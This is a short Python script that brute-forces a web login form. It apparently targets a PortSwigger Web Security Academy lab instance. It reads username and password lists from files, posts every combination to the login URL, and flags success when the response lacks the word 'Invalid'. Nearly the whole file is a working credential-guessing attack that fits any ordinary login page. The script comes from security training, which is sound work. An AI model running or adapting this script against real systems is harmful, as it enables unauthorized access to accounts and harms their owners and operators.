import requests

# Target login URL 
URL = "https://0a83007804c0fa3187216bdc007600d1.web-security-academy.net/login"

# Username list
with open('users.txt', 'r') as users_file:
    usernames = users_file.read().splitlines()

# Password list
with open('pswd.txt', 'r') as pswd_file:
    passwords = pswd_file.read().splitlines()  # Fixed the variable name

# Loop through username and password combinations
for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password
        }
        
        # Send the POST request
        response = requests.post(URL, data=data)

        # Debugging: Print response content (for analysis)
        # print(response.text)

        # Check response for a successful login
        if "Invalid" not in response.text and response.status_code == 200:
            print(f"[+] Login successful: {username} : {password}")
            break  # Stop after the first success
        else:
            print(f"[-] Failed: {username} : {password}")
